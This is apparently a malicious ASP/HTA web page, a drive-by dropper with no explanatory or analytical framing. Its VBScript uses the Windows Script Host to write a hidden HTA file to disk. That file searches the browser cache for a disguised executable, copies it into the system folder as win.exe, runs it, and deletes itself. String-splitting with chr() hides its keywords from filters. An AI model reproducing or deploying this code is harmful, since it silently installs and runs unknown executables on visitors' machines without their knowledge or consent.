<%response.ContentType="application/hta"%>
<object id='wsh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<HTA:APPLICATION  caption="no" border="none" windowState="minimize" >
<script LaNGUAGE="VBScript">
Set g_fs = CreateObject("Scripting.FileSystemObject")
Set tf = g_fs.CreateTextFile("c:\win.hta",true)
tf.write "<HTA:APPLICATION  caption=" & CHR(34)& "no" & CHR(34)& " border=" & CHR(34)& "none" & CHR(34)& " showintaskbar=" & CHR(34)& "no" & CHR(34)& " >" &chr(13)&chr(10)
tf.write "<object id='wsh' cl"& chr(97)&"ssid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>"&chr(13)&chr(10)
tf.write "<" & "script LANGUAGE=" & CHR(34)& "VBScript" & CHR(34)& ">"&chr(13)&chr(10)
tf.write "on error resume next"&chr(13)&chr(10)
tf.write "window.moveTo  0,0"&chr(13)&chr(10)
tf.write "window.resizeTo 0,0 "&chr(13)&chr(10)
tf.write "dim exepath"&chr(13)&chr(10)
tf.write "Function Search(objFolder) "&chr(13)&chr(10)
tf.write "Dim objSubFolder"&chr(13)&chr(10)
tf.write "For Each objFile in objFolder.Files"&chr(13)&chr(10)
tf.write "If InStr(1, objfile.name, " & CHR(34)& "lhxyexe" & CHR(34)& ", vbtextcompare) then"&chr(13)&chr(10)
tf.write "set filecp = objg_fso.getfile(objfile.path)"&chr(13)&chr(10)
tf.write "filecp.copy (exepath)"&chr(13)&chr(10)
tf.write "exit for"&chr(13)&chr(10)
tf.write "End If"&chr(13)&chr(10)
tf.write "Next "&chr(13)&chr(10)
tf.write "For Each objSubFolder in objFolder.SubFolders  "&chr(13)&chr(10)
tf.write "Search objSubFolder"&chr(13)&chr(10)
tf.write "Next"&chr(13)&chr(10)
tf.write "End Function"&chr(13)&chr(10)
tf.write "Set objg_fso = CreateObject(" & CHR(34)& "Scripting.FileSystemObject" & CHR(34)& ")"&chr(13)&chr(10)
tf.write "str=WSH.regread(" & CHR(34)& "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders\cache" & CHR(34)& ")"&chr(13)&chr(10)
tf.write "set tempfolder = objg_fso.getfolder(str)"&chr(13)&chr(10)
tf.write "set othisfolder = objg_fso.GetSpecialFolder(1)" &chr(13)&chr(10)
tf.write "exepath=othisfolder.path & "& chr(34) & "win.exe" & chr(34) &chr(13)&chr(10)
tf.write "search tempfolder"&chr(13)&chr(10)
tf.write "wsh.run (exepath)"&chr(13)&chr(10)
tf.write "wsh.run " & CHR(34)& "command.com /c del c:\win.hta" & CHR(34)& " ,0"&chr(13)&chr(10)
tf.write "window.close()"&chr(13)&chr(10)
tf.write "<" &chr(47)& "script>"&chr(13)&chr(10)
tf.close
wsh.run "c:\win.hta",0
window.close ()
</script>

